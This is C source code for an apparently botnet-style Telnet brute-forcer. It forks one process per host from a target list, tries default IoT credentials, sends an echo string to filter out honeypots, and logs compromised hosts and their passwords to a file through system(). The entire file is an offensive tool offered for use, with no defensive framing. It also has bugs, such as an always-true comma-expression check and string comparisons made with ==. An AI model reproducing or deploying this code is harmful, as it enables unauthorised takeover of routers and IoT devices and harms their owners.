/*
	Telnet Bruter with String Checking for Honeypots
*/

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <ctype.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

int Timeout;
int port = 23; // Change to use for Different Devices or Telnet on a Diff Port
int statement;
char buf[1024];
char combo[60];
char *combos[] = {"root:root", "default:", "root:default", "root:admin", "bin:"};
char *succ_str = "RyM_Gang"; // String We Check For
char omglol[100];

#define combo_size (sizeof(combos) / sizeof(unsigned char *))
#define SUCCESS "(\x1b[32m%s\x1b[37m:\x1b[32m%d\x1b[37m)"
#define FAILED "(\x1b[31m%s\x1b[37m:\x1b[31m%d\x1b[37m)"
#define INFO "(\x1b[33m%s\x1b[37m:\x1b[33m%d\x1b[37m)"

void Trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

void brute(char *target)
{
	int Read;
	int c = 0;
	int Socket;
	char cmd[70];
	statement = 0;
	char buffer[1024];
	struct sockaddr_in sock;
	struct timeval timeout;
	char *username;
	char password[40];
	char username2[25];
	char password2[44];
	s:
	switch(statement)
	{
		case 0:
		{
			if(c > combo_size)
				goto end;
			timeout.tv_sec = Timeout;
			timeout.tv_usec = 0;
			if(!(Socket = socket(AF_INET, SOCK_STREAM, 0)))
				return;
			setsockopt(Socket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
			setsockopt(Socket, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
			sock.sin_family = AF_INET;
			sock.sin_port = htons(port);
			sock.sin_addr.s_addr = inet_addr(target);
			if(connect(Socket, (struct sockaddr *)&sock, sizeof(sock)) == -1)
			{
				statement = 0;
				goto end;
			}
			//else
				//printf(SUCCESS" Connected!\n", target, port);
			statement += 1;
			goto s;
		}
		break;
		
		case 1:
		{
			snprintf(combo, sizeof(combo), "%s", combos[c]);
			if(combo == NULL || combo == " " || combo == "(null)")
				goto end;
			username = strtok(combo, ":");
			snprintf(password, sizeof(password), "%s", username+strlen(username)+1);
			snprintf(username2, sizeof(username2), "%s\r\n", username);
			snprintf(password2, sizeof(password2), "%s\r\n", password);
			
			//printf(INFO" Trying Combo -> %s:%s\n", target, port, username, password);
			while(Read = read(Socket, buffer, 1024))
			{
				buffer[Read] = '\0';
				if(strstr(buffer, "ogin"))
				{
					//printf(SUCCESS" Found login prompt!\n", target, port);
					goto send_user;
				}
			}
			send_user:
			if(send(Socket, username2, strlen(username2), 0))
			{
				//printf(SUCCESS" Sent username %s!\n", target, port, username);
				while(Read = read(Socket, buffer, 1024))
				{
					buffer[Read] = '\0';
					if(strstr(buffer, "ailed") || strstr(buffer, "ncorrect") || strstr(buffer, "rong"))
					{
						//printf(FAILED" Incorrect username...\n", target, port);
						c += 1;
						close(Socket);
						statement = 0;
						goto s;
					}
					else if(strstr(buffer, "@") || strstr(buffer, "#") || strstr(buffer, "$") || strstr(buffer, "%") || strstr(buffer, "elcome") || strstr(buffer, "usybox") || strstr(buffer, "usyBox") || strstr(buffer, ">") || strstr(buffer, "ONT"))
					{
						snprintf(omglol, sizeof(omglol), "echo '%s'\r\n", succ_str);
						if(send(Socket, omglol, strlen(omglol), 0))
						{
							//printf(INFO" Sent String to Check for Honeypot...\n", target, port);
							continue;
						}
					}
					else if(strstr(buffer, "assword"))
					{
						//printf(SUCCESS" Found password prompt!\n", target, port);
						goto send_pw;
					}
					else if(strstr(buffer, succ_str))
					{
						printf(SUCCESS" Successful Login with No Password -> %s\n", target, port, username);
						snprintf(cmd, sizeof(cmd), "echo '%s:%d %s:%s' >> active_telnet", target, port, username, password);
						system(cmd);
						goto end;
					}
				}
				send_pw:
				if(send(Socket, password2, strlen(password2), 0))
				{
					//printf(SUCCESS" Sent password %s!\n", target, port, password);
					while(Read = read(Socket, buffer, 1024))
					{
						buffer[Read] = '\0';
						if(strstr(buffer, "ailed") || strstr(buffer, "ncorrect") || strstr(buffer, "rong"))
						{
							//printf(FAILED" Incorrect credentials...\n", target, port);
							c += 1;
							close(Socket);
							statement = 0;
							goto s;
						}
						else if(strstr(buffer, "@") || strstr(buffer, "#") || strstr(buffer, "$") || strstr(buffer, "%") || strstr(buffer, "elcome") || strstr(buffer, "usybox") || strstr(buffer, "usyBox") || strstr(buffer, ">") || strstr(buffer, "ONT"))
						{
							snprintf(omglol, sizeof(omglol), "echo '%s'\r\n", succ_str);
							if(send(Socket, omglol, strlen(omglol), 0))
							{
								//printf(INFO" Sent String to Check for Honeypot...\n", target, port);
								continue;
							}
						}
						else if(buffer, succ_str)
						{
							printf(SUCCESS" Successful Login -> %s:%s\n", target, port, username, password);
							snprintf(cmd, sizeof(cmd), "echo '%s:%d %s:%s' >> active_telnet", target, port, username, password); // too lazy to write to file
							system(cmd);
							goto end;
						}
					}
				}
			}
		}
		break;
	}
	end:
	c = 0;
	statement = 0;
	close(Socket);
	return;
}

int main(int argc, char **argv)
{
	if(argc < 3 || argc > 3)
	{
		printf("[\x1b[31m-\x1b[37m] Usage: %s <timeout> <list>\n", argv[0]);
		exit(0);
	}
	Timeout = atoi(argv[1]);
	FILE *vuln_list = fopen(argv[2], "r");
	if(vuln_list == NULL)
	{
		printf("[\x1b[31m-\x1b[37m] Failed to Open Given List (\x1b[33m%s\x1b[37m)\n", argv[2]);
		exit(0);
	}
	while(fgets(buf, sizeof(buf) - 1, vuln_list))
	{
		if(strlen(buf) < 3 || buf == NULL)
			break;
		Trim(buf);
		if(!(fork()))
		{
			brute(buf);
			exit(0);
		}
	}
	return;
}